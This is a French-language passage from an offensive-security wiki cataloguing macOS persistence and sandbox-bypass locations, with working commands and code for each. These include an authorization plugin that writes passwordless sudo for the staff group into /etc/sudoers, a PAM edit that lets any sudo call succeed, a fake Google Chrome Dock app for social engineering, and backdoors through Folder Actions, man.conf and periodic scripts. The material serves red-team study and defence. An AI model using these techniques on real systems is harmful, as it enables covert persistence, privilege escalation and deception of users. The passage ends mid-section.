Analyse : [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* Utile pour contourner le bac à sable : [✅](https://emojipedia.org/check-mark-button)
* Mais vous devez **exécuter** **`at`** et il doit être **activé**
* Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

* Besoin d'**exécuter** **`at`** et il doit être **activé**

#### **Description**

Les tâches `at` sont conçues pour **planifier des tâches ponctuelles** à exécuter à des moments précis. Contrairement aux tâches cron, les tâches `at` sont automatiquement supprimées après l'exécution. Il est crucial de noter que ces tâches persistent à travers les redémarrages du système, ce qui les classe comme des préoccupations de sécurité potentielles dans certaines conditions.

Par **défaut**, elles sont **désactivées** mais l'utilisateur **root** peut les **activer** avec :
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Cela créera un fichier dans 1 heure :
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Vérifiez la file d'attente des tâches en utilisant `atq`:
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Ci-dessus, nous pouvons voir deux tâches planifiées. Nous pouvons imprimer les détails de la tâche en utilisant `at -c NUMÉRODETÂCHE`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
Si les tâches AT ne sont pas activées, les tâches créées ne seront pas exécutées.
{% endhint %}

Les **fichiers de tâches** peuvent être trouvés à `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Le nom de fichier contient la file d'attente, le numéro de tâche et l'heure à laquelle elle est programmée pour s'exécuter. Par exemple, examinons `a0001a019bdcd2`.

* `a` - c'est la file d'attente
* `0001a` - numéro de tâche en hexadécimal, `0x1a = 26`
* `019bdcd2` - heure en hexadécimal. Il représente les minutes écoulées depuis l'époque. `0x019bdcd2` est `26991826` en décimal. Si nous le multiplions par 60, nous obtenons `1619509560`, qui est `GMT: 2021. April 27., Tuesday 7:46:00`.

Si nous imprimons le fichier de tâche, nous constatons qu'il contient les mêmes informations que celles obtenues en utilisant `at -c`.

### Actions de Dossier

Writeup: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* Utile pour contourner le bac à sable: [✅](https://emojipedia.org/check-mark-button)
* Mais vous devez être capable d'appeler `osascript` avec des arguments pour contacter **`System Events`** afin de pouvoir configurer les Actions de Dossier
* Contournement de TCC: [🟠](https://emojipedia.org/large-orange-circle)
* Il a quelques autorisations TCC de base comme Bureau, Documents et Téléchargements

#### Emplacement

* **`/Library/Scripts/Folder Action Scripts`**
* Nécessite les droits d'administrateur
* **Déclencheur**: Accès au dossier spécifié
* **`~/Library/Scripts/Folder Action Scripts`**
* **Déclencheur**: Accès au dossier spécifié

#### Description & Exploitation

Les Actions de Dossier sont des scripts déclenchés automatiquement par des changements dans un dossier tels que l'ajout, la suppression d'éléments, ou d'autres actions comme l'ouverture ou le redimensionnement de la fenêtre du dossier. Ces actions peuvent être utilisées pour diverses tâches et peuvent être déclenchées de différentes manières, comme en utilisant l'interface Finder ou des commandes terminal.

Pour configurer des Actions de Dossier, vous avez des options comme:

1. Créer un flux de travail d'Action de Dossier avec [Automator](https://support.apple.com/guide/automator/welcome/mac) et l'installer en tant que service.
2. Attacher un script manuellement via la Configuration des Actions de Dossier dans le menu contextuel d'un dossier.
3. Utiliser OSAScript pour envoyer des messages d'événements Apple à l'application `System Events.app` pour configurer de manière programmatique une Action de Dossier.
* Cette méthode est particulièrement utile pour intégrer l'action dans le système, offrant un niveau de persistance.

Le script suivant est un exemple de ce qui peut être exécuté par une Action de Dossier:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Pour rendre le script ci-dessus utilisable par les actions de dossier, compilez-le en utilisant :
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Après la compilation du script, configurez les Actions de dossier en exécutant le script ci-dessous. Ce script activera les Actions de dossier de manière globale et attachera spécifiquement le script compilé précédemment au dossier Bureau.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
Exécutez le script de configuration avec :
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
* Voici la manière de mettre en œuvre cette persistance via l'interface graphique :

Voici le script qui sera exécuté :

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Compilez-le avec : `osacompile -l JavaScript -o folder.scpt source.js`

Déplacez-le vers :
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Ensuite, ouvrez l'application `Folder Actions Setup`, sélectionnez le **dossier que vous souhaitez surveiller** et sélectionnez dans votre cas **`folder.scpt`** (dans mon cas je l'ai appelé output2.scp) :

<figure><img src="../.gitbook/assets/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Maintenant, si vous ouvrez ce dossier avec **Finder**, votre script sera exécuté.

Cette configuration était stockée dans le **plist** situé dans **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** au format base64.

Maintenant, essayons de préparer cette persistance sans accès GUI :

1. **Copiez `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** vers `/tmp` pour le sauvegarder :
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Supprimez** les Folder Actions que vous venez de définir :

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

Maintenant que nous avons un environnement vide

3. Copiez le fichier de sauvegarde : `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Ouvrez l'application Folder Actions Setup pour consommer cette configuration : `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
Et cela n'a pas fonctionné pour moi, mais ce sont les instructions du rapport :(
{% endhint %}

### Raccourcis Dock

Rapport : [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* Utile pour contourner le bac à sable : [✅](https://emojipedia.org/check-mark-button)
* Mais vous devez avoir installé une application malveillante dans le système
* Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

* `~/Library/Preferences/com.apple.dock.plist`
* **Déclencheur** : Lorsque l'utilisateur clique sur l'application dans le dock

#### Description & Exploitation

Toutes les applications qui apparaissent dans le Dock sont spécifiées dans le plist : **`~/Library/Preferences/com.apple.dock.plist`**

Il est possible d'**ajouter une application** simplement avec :

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

En utilisant un peu d'**ingénierie sociale**, vous pourriez **vous faire passer par exemple pour Google Chrome** dans le dock et en réalité exécuter votre propre script :
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Sélecteurs de couleurs

Writeup: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* Utile pour contourner le bac à sable : [🟠](https://emojipedia.org/large-orange-circle)
* Une action très spécifique doit se produire
* Vous vous retrouverez dans un autre bac à sable
* Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

* `/Library/ColorPickers`
* Nécessite des privilèges d'administrateur
* Déclencheur : Utilisation du sélecteur de couleurs
* `~/Library/ColorPickers`
* Déclencheur : Utilisation du sélecteur de couleurs

#### Description & Exploitation

**Compilez un bundle de sélecteur de couleurs** avec votre code (vous pourriez utiliser [**celui-ci par exemple**](https://github.com/viktorstrate/color-picker-plus)) et ajoutez un constructeur (comme dans la [section Économiseur d'écran](macos-auto-start-locations.md#screen-saver)) puis copiez le bundle dans `~/Library/ColorPickers`.

Ensuite, lorsque le sélecteur de couleurs est déclenché, votre code devrait également l'être.

Notez que le binaire chargeant votre bibliothèque a un **bac à sable très restrictif** : `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Extensions de synchronisation Finder

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Writeup**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* Utile pour contourner le bac à sable : **Non, car vous devez exécuter votre propre application**
* Contournement de TCC : ???

#### Emplacement

* Une application spécifique

#### Description & Exploit

Un exemple d'application avec une extension Finder Sync [**peut être trouvé ici**](https://github.com/D00MFist/InSync).

Les applications peuvent avoir des `Extensions de synchronisation Finder`. Cette extension ira à l'intérieur d'une application qui sera exécutée. De plus, pour que l'extension puisse exécuter son code, elle **doit être signée** avec un certificat de développeur Apple valide, elle doit être **sous bac à sable** (bien que des exceptions assouplies puissent être ajoutées) et elle doit être enregistrée avec quelque chose comme :
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Économiseur d'écran

Writeup: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* Utile pour contourner le bac à sable : [🟠](https://emojipedia.org/large-orange-circle)
* Mais vous finirez dans un bac à sable d'application commun
* Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

* `/System/Library/Screen Savers`
* Nécessite les droits d'administrateur
* **Déclencheur** : Sélectionnez l'économiseur d'écran
* `/Library/Screen Savers`
* Nécessite les droits d'administrateur
* **Déclencheur** : Sélectionnez l'économiseur d'écran
* `~/Library/Screen Savers`
* **Déclencheur** : Sélectionnez l'économiseur d'écran

<figure><img src="../.gitbook/assets/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Description & Exploit

Créez un nouveau projet dans Xcode et sélectionnez le modèle pour générer un nouveau **économiseur d'écran**. Ensuite, ajoutez-y votre code, par exemple le code suivant pour générer des journaux.

**Compilez** et copiez le paquet `.saver` dans **`~/Library/Screen Savers`**. Ensuite, ouvrez l'interface graphique de l'économiseur d'écran et si vous cliquez simplement dessus, cela devrait générer beaucoup de journaux :

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
Notez que parce que à l'intérieur des autorisations du binaire qui charge ce code (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) vous pouvez trouver **`com.apple.security.app-sandbox`** vous serez **à l'intérieur du bac à sable d'application commun**.
{% endhint %}

Code du protecteur d'écran :
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Plugins Spotlight

writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* Utile pour contourner le bac à sable: [🟠](https://emojipedia.org/large-orange-circle)
* Mais vous finirez dans un bac à sable d'application
* Contournement de TCC: [🔴](https://emojipedia.org/large-red-circle)
* Le bac à sable semble très limité

#### Emplacement

* `~/Library/Spotlight/`
* **Déclencheur**: Un nouveau fichier avec une extension gérée par le plugin Spotlight est créé.
* `/Library/Spotlight/`
* **Déclencheur**: Un nouveau fichier avec une extension gérée par le plugin Spotlight est créé.
* Nécessite les droits d'administrateur
* `/System/Library/Spotlight/`
* **Déclencheur**: Un nouveau fichier avec une extension gérée par le plugin Spotlight est créé.
* Nécessite les droits d'administrateur
* `Some.app/Contents/Library/Spotlight/`
* **Déclencheur**: Un nouveau fichier avec une extension gérée par le plugin Spotlight est créé.
* Nouvelle application requise

#### Description & Exploitation

Spotlight est la fonction de recherche intégrée de macOS, conçue pour offrir aux utilisateurs un **accès rapide et complet aux données de leurs ordinateurs**.\
Pour faciliter cette capacité de recherche rapide, Spotlight maintient une **base de données propriétaire** et crée un index en **analysant la plupart des fichiers**, permettant des recherches rapides à la fois dans les noms de fichiers et leur contenu.

Le mécanisme sous-jacent de Spotlight implique un processus central nommé 'mds', qui signifie **'serveur de métadonnées'**. Ce processus orchestre l'ensemble du service Spotlight. En complément, il existe plusieurs démons 'mdworker' qui effectuent diverses tâches de maintenance, telles que l'indexation de différents types de fichiers (`ps -ef | grep mdworker`). Ces tâches sont rendues possibles grâce aux plugins importateurs Spotlight, ou **bundles ".mdimporter"**, qui permettent à Spotlight de comprendre et d'indexer le contenu de divers formats de fichiers.

Les plugins ou **bundles `.mdimporter`** sont situés aux endroits mentionnés précédemment et si un nouveau bundle apparaît, il est chargé en quelques minutes (pas besoin de redémarrer un service). Ces bundles doivent indiquer quels **types de fichiers et extensions ils peuvent gérer**, de cette manière, Spotlight les utilisera lorsqu'un nouveau fichier avec l'extension indiquée est créé.

Il est possible de **trouver tous les `mdimporters`** chargés en exécutant:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Et par exemple **/Library/Spotlight/iBooksAuthor.mdimporter** est utilisé pour analyser ce type de fichiers (extensions `.iba` et `.book` entre autres) :
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
Si vous vérifiez le Plist d'autres `mdimporter`, vous pourriez ne pas trouver l'entrée **`UTTypeConformsTo`**. C'est parce que c'est un _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) intégré et il n'a pas besoin de spécifier les extensions.

De plus, les plugins par défaut du système ont toujours la priorité, donc un attaquant ne peut accéder qu'aux fichiers qui ne sont pas indexés par les propres `mdimporters` d'Apple.
{% endhint %}

Pour créer votre propre importateur, vous pourriez commencer avec ce projet : [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) puis changer le nom, les **`CFBundleDocumentTypes`** et ajouter **`UTImportedTypeDeclarations`** pour qu'il prenne en charge l'extension que vous souhaitez supporter et les refléter dans **`schema.xml`**. Ensuite, **modifiez** le code de la fonction **`GetMetadataForFile`** pour exécuter votre charge utile lorsqu'un fichier avec l'extension traitée est créé.

Enfin, **construisez et copiez votre nouveau `.mdimporter`** dans l'un des emplacements précédents et vous pouvez vérifier s'il est chargé en **surveillant les journaux** ou en vérifiant **`mdimport -L.`**

### ~~Panneau de préférences~~

{% hint style="danger" %}
Il semble que cela ne fonctionne plus.
{% endhint %}

Writeup : [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* Utile pour contourner le bac à sable : [🟠](https://emojipedia.org/large-orange-circle)
* Nécessite une action utilisateur spécifique
* Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### Description

Il semble que cela ne fonctionne plus.

## Contournement du bac à sable root

{% hint style="success" %}
Ici, vous pouvez trouver des emplacements de démarrage utiles pour le **contournement du bac à sable** qui vous permettent simplement d'exécuter quelque chose en **l'écrivant dans un fichier** en étant **root** et/ou en nécessitant d'autres **conditions étranges.**
{% endhint %}

### Périodique

Writeup : [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* Utile pour contourner le bac à sable : [🟠](https://emojipedia.org/large-orange-circle)
* Mais vous devez être root
* Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* Nécessite d'être root
* **Déclencheur** : Quand le moment arrive
* `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local`
* Nécessite d'être root
* **Déclencheur** : Quand le moment arrive

#### Description & Exploitation

Les scripts périodiques (**`/etc/periodic`**) sont exécutés en raison des **daemons de lancement** configurés dans `/System/Library/LaunchDaemons/com.apple.periodic*`. Notez que les scripts stockés dans `/etc/periodic/` sont **exécutés** en tant que **propriétaire du fichier**, donc cela ne fonctionnera pas pour une éventuelle élévation de privilèges.

{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

Il existe d'autres scripts périodiques qui seront exécutés indiqués dans **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Si vous parvenez à écrire l'un des fichiers `/etc/daily.local`, `/etc/weekly.local` ou `/etc/monthly.local`, il sera **exécuté tôt ou tard**.

{% hint style="warning" %}
Notez que le script périodique sera **exécuté en tant que propriétaire du script**. Ainsi, si un utilisateur régulier est propriétaire du script, il sera exécuté en tant qu'utilisateur (ceci pourrait empêcher les attaques d'escalade de privilèges).
{% endhint %}

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* Utile pour contourner le bac à sable : [🟠](https://emojipedia.org/large-orange-circle)
* Mais vous devez être root
* Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

* Toujours nécessite des privilèges root

#### Description & Exploitation

Comme PAM est plus axé sur la **persistance** et les logiciels malveillants que sur l'exécution facile à l'intérieur de macOS, ce blog ne donnera pas d'explication détaillée, **lisez les writeups pour mieux comprendre cette technique**.

Vérifiez les modules PAM avec :
```bash
ls -l /etc/pam.d
```
Une technique de persistance/escalade de privilèges abusant de PAM est aussi simple que de modifier le module /etc/pam.d/sudo en ajoutant au début la ligne :
```bash
auth       sufficient     pam_permit.so
```
Donc cela ressemblera à quelque chose comme ceci :
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Et donc toute tentative d'utiliser **`sudo` fonctionnera**.

{% hint style="danger" %}
Notez que ce répertoire est protégé par TCC, il est donc très probable que l'utilisateur reçoive une invite demandant l'accès.
{% endhint %}

### Plugins d'autorisation

Writeup : [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Writeup : [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* Utile pour contourner le bac à sable : [🟠](https://emojipedia.org/large-orange-circle)
* Mais vous devez être root et effectuer des configurations supplémentaires
* Contournement de TCC : ???

#### Emplacement

* `/Library/Security/SecurityAgentPlugins/`
* Nécessite des privilèges root
* Il est également nécessaire de configurer la base de données d'autorisation pour utiliser le plugin

#### Description & Exploitation

Vous pouvez créer un plugin d'autorisation qui sera exécuté lorsque qu'un utilisateur se connecte pour maintenir la persistance. Pour plus d'informations sur la création de ces plugins, consultez les writeups précédents (et soyez prudent, un plugin mal écrit peut vous bloquer et vous devrez nettoyer votre Mac en mode de récupération).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Déplacez** le bundle à l'emplacement à charger :
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Enfin, ajoutez la **règle** pour charger ce plugin :
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Le **`evaluate-mechanisms`** indiquera au framework d'autorisation qu'il devra **appeler un mécanisme externe pour l'autorisation**. De plus, **`privileged`** fera en sorte qu'il soit exécuté par root.

Déclenchez-le avec :
```bash
security authorize com.asdf.asdf
```
Et ensuite le groupe **staff devrait avoir un accès sudo** (lire `/etc/sudoers` pour confirmer).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* Utile pour contourner le bac à sable : [🟠](https://emojipedia.org/large-orange-circle)
* Mais vous devez être root et l'utilisateur doit utiliser man
* Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

* **`/private/etc/man.conf`**
* Requis root
* **`/private/etc/man.conf`**: Chaque fois que man est utilisé

#### Description & Exploit

Le fichier de configuration **`/private/etc/man.conf`** indique le binaire/script à utiliser lors de l'ouverture des fichiers de documentation man. Ainsi, le chemin vers l'exécutable pourrait être modifié de sorte que chaque fois que l'utilisateur utilise man pour lire des documents, une porte dérobée est exécutée.

Par exemple, défini dans **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
Et ensuite créez `/tmp/view` comme suit :
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* Utile pour contourner le bac à sable: [🟠](https://emojipedia.org/large-orange-circle)
* Mais vous devez être root et apache doit être en cours d'exécution
